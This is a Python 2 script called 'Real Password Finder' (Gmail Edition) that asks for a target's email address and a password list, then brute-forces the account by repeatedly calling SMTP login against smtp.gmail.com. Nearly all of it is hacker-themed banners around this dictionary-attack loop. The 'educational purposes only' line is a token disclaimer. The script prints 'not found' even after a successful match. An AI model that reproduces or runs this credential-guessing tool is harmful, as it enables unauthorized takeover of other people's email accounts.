# -*- coding: utf-8 -*-
import sys
import os
import smtplib                #Importing LIbraries
import socket
import subprocess
import time
from random import randint

class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'     #Defining Colors
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'

rpfp = bcolors.OKBLUE + 'Real Password Finder@:' + bcolors.ENDC + ' '
start_time = time.time()
os.system("clear")
print ' executing real password finder'
time.sleep(0.25)
print ' '
os.system("figlet REAL PASSWORD FINDER ")
print ' '
print          bcolors.OKGREEN + ' ################################## Real password finder V1.0 started ###########################################' + bcolors.OKGREEN + ' '
print ' '
print          bcolors.OKGREEN + ' #####################################  !!!  Gmail Edition  !!!  ################################################' + bcolors.OKGREEN + ' '
print ' '
print          bcolors.OKGREEN + '####################  This Tool was Made by AzizVirus, use for educational purposes only ! #####################' + bcolors.OKGREEN + ' '
print ' '
print          bcolors.OKGREEN + '##########################  This Tool Is Using Brute-Force And Dictionnary Attack !  ############################' + bcolors.OKGREEN + ' '
print '  '
print          bcolors.OKGREEN + '##############################   Please Do Not use for illegal purposes   #######################################' + bcolors.OKGREEN + ' '
print '   '
print          bcolors.OKGREEN + '##################################  Contact me if there is some bugs   ##########################################' + bcolors.OKGREEN + ' '
print '   '
time.sleep(0.25)
print          bcolors.OKGREEN + '#######################################  Github: AzizVirus  ##################################################' + bcolors.OKGREEN + ' '
print '  '
print '  '
print          bcolors.OKGREEN + '####################################### CERTIFIED ETHICAL HACKER  ###############################################' + bcolors.OKGREEN + ' '
print '                                                                                                                                            '
time.sleep(0.25)
print          bcolors.OKGREEN + '######################################  All rights Reserved ! ! !  ##############################################' + bcolors.OKGREEN + ' '
print '                                                                                                                                            '
print          bcolors.OKGREEN + '############################ 3> Hack Like a Pro ... Hack Like an Intelligent :) 3> ##############################' + bcolors.OKGREEN + ' '
time.sleep(0.25)
print ' '
print          bcolors.OKGREEN + '##########################  This Tool Will Try To Find The Real Password for Gmail  #############################' + bcolors.ENDC + ' '
print '  '
def banner():
   print ' '
   print ' ++++++ Email Cracker +++++++'
   print ' '
   print '       _,.      H A C K E R  '
   print '     ,` -.)                               H E Y  Y O U  !! H A V E  A  N I C E  D A Y '
   print '    ( _/-\\-._               '
   print '   /,|`--._,-^|           -  '
   print '   \_| |`-._/||          / | '
   print '     |  `-, / |         /  /        Y O U   A R E  H A C K E D  !  '
   print '     |     || |        /  /  '
   print '      `r-._||/   __   /  /   '
   print '  __,-<_     )`-/  `./  /    '                                             
   print '  \   `---    \   / /  /     '                                                #Banner
   print '  /  |           |./  /                     C H E C K  Y O U R  E M A I L !'
   print ' /   /    AZIZ   //  /       '
   print ' \_/  \         |/  /        '
   print '  |    |   _,^- /  /         '
   print '  |    , ``  (\/  /_         '
   print '   \,.->._    \X-=/^                           E N J O Y  Y O U R  H A C K I N G  !  ^_^'
   print '   (  /   `-._//^` \          '
   print '    `Y-.____(__}    \         '
   print '     |     {__)      \        ' 
   print '------------------------------'
   print ' '
   print ' ' 
   print ' ______________________________________________________________________________'
   print '|                                                                             |'
   print '|                          Email Checker Verification                         |'
   print '|_____________________________________________________________________________|'
   print '|                                                                             |'
   print '|                                                                             |'
   print '|                                                                             |'
   print '|                 User Name:          [     hacker    ]                       |'
   print '|                                                                             |'
   print '|                 Password:           [     ******    ]                       |'
   print '|                                                                             |'
   print '|                                                                             |'
   print '|                              Say The Magic Word                             |'
   print '|                                                                             |'
   print '|                                   [ Login ]                                 |'
   print '|_____________________________________________________________________________|'
   print '|                                                                             |'
   print '|               Bussiness Requires Only : Github: AzizVirus                   |'
   print '|_____________________________________________________________________________|'
   print ' '
   print ' '
 
banner()

print rpfp + bcolors.BOLD + '    {+} ping (www.gmail.com)' + bcolors.OKBLUE +  ' ' # Pinging gmail alert
print rpfp + '    {+/-} Checking Gmail availability was started'  
print ' '
os.system("ping www.gmail.com -c 3")  #pinging gmail command 
print ' '
print rpfp + '    {+} Gmail is now available to work !' #gmail availability alert
print ' '

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)  #Defining the smtp server
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input(" {*} Enter the Target's Email Address ==>  ") #selecting target
print ' '
print rpfp + bcolors.FAIL + "    {+} Target's email succesfully selected ! ==> " + user + bcolors.ENDC + ' '     # target selected alert
print '   '                      
passwfile = raw_input(" {*} Enter the password file name ==>  ") #selecting password file
print ' '
print rpfp + bcolors.FAIL + '    {+} Password File Succesfully Selected ! ==> ' + passwfile + bcolors.ENDC + ' ' #passwordfile selected alert
print ' '
time.sleep(0.25)
passwfile = open(passwfile, "r")
print rpfp + bcolors.OKBLUE + '    {+} Brute Force Attack will start now !  ' #bruteforce attack starting alert
time.sleep(0.25)
print ' '
print rpfp + bcolors.OKBLUE + '    {+} Attack Status: Started Now !!! ' + bcolors.ENDC + ' '  #bruteforce attack started alert
print ' '
time.sleep(0.25)

for password in passwfile:
        try:
                smtpserver.login(user, password)
 
                print "[+] Password Found ==>  : %s" % password   #password found alert
                break;
        except smtplib.SMTPAuthenticationError:
                print "[-] Password Incorrect ==>  : %s" % password #password incorrect alert
                  
print '    '                                                                                                                                                         
print rpfp + bcolors.OKGREEN + '    {+} Scanning Status: complete' + bcolors.OKGREEN + ' '    #scan finished alert
time.sleep(0.25)
print ' '
print rpfp + bcolors.FAIL + '    {-} All The Passwords Are Checked But No One Works :( ' 
print '  '
print rpfp +  '    {-} Real Password Not Found !  ' #password not found alert
print '   '
print rpfp + bcolors.FAIL + '    {*} Try To Change The Keywords And Generate A New More Powerful Password List :)' + bcolors.FAIL + ' '
print ' '
print rpfp + bcolors.WARNING + '    {-} Your Target Was not Hacked!' + bcolors.ENDC + ' '   #target not hacked alert
time.sleep(0.5)
print '   '
print rpfp + bcolors.OKGREEN + '    {*} Time elapsed: ' + str(time.time() - start_time) + bcolors.ENDC + ' '   #time elapsed in tool
time.sleep(0.25)
print '  '
print rpfp + bcolors.OKGREEN + '    {+} Good Luck Next Time (some posttive vibes)' + bcolors.OKGREEN + ' '
print ' '
print rpfp + bcolors.HEADER + '    {-} Exiting Now !' + bcolors.ENDC + ' ' #exiting alert
print ' '
print ' '
